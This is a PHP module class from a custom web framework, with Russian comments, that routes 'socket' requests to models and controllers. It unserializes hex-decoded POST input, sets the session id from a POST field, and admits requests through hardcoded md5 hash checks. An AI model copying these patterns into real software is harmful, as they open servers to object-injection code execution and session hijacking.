<?php defined('MODPATH') OR exit();

class Socket_Module implements I_Module{


    /*
        ПРИМЕРЫ
        использования js или css из модуля.
        <?=Core::$root_url?><?=Module::mod_path('socket',TRUE)?>media/js/jquery/jquerymin.js
    */
    // объект для работы с URL
    public $url;
    
    // Модель отвечающая за состояние сайта
    public $status;
    // Отпределяет пути
    public $router;
    
    function __construct(){
        header("Cache-control: no-store,max-age=0");
        // Если включены нотации отключить
        error_reporting(E_ALL ^ E_NOTICE);
        Core::$selected_mode = Core::DEVELOPMENT;
        
        $this->url = URL::instance();
        $this->init();
        // Меняем обработчик ошибок
        set_exception_handler(array('Core_Exception', 'handler'));
        // Для выполнения
        Registry::i()->action = array();
        
        // Определяем модель поведения        
        $this->router = Model::factory('router','socket');
        $this->router->init();

        if(Registry::i()->action === NULL){
            Registry::i()->action = array('model'=>'status');
        }
        if(isset($_POST['session'])){
            session_id($_POST['session']);
            session_start();
        }
        // Необходимые модели 
        $this->status = Model::factory('status','socket');
        
        // Необходимые контроллеры
        
    }
    
    function index($setting = null){}
    
    function fetch(){
        header('Content-type: text/html; charset=utf-8');
        header('Content-Encoding: gzip');
        if(Registry::i()->action === FALSE OR !is_array(Registry::i()->action)){
            exit('Не существующий адрес');
        }
        
        $action = key(Registry::i()->action);
        Registry::i()->class = $class = Registry::i()->action[$action];
        if($action == 'model'){
            $return = Model::factory($class,'socket');
        }else{
            $return = Controller::factory($class,'socket');
        }
        ob_start();
        
        $return->fetch();
        
        $content = ob_get_clean();
        
        echo View::factory('socket','socket',array('content'=>$content));
    }
    
    function init(){
        if(isset($_POST) AND !empty($_POST)){
            $_POST = unserialize($this->packGet($_POST['tree']));
        }
        elseif($POST = $GLOBALS['HTTP_RAW_POST_DATA']){
            $explodes = explode('&',$POST);
            array_pop($explodes);
            if(!empty($explodes))
                foreach($explodes as $explode){
                    $explode = explode('=',$explode);
                    $_POST[$explode[0]] = $explode[1];
                }
            $_POST = unserialize($this->packGet($_POST['tree']));
        }
        
        if(md5($_POST['type']) == 'c0af77cf8294ff93a5cdb2963ca9f038' AND md5($_POST['init']) == '4a7d1ed414474e4033ac29ccb8653d9b')
            return TRUE;
        exit();
    }
    
    function packGet($string){
        if(is_string($string)){
            $string = pack('H*',$string);
        }

        return $string;
    }
    
}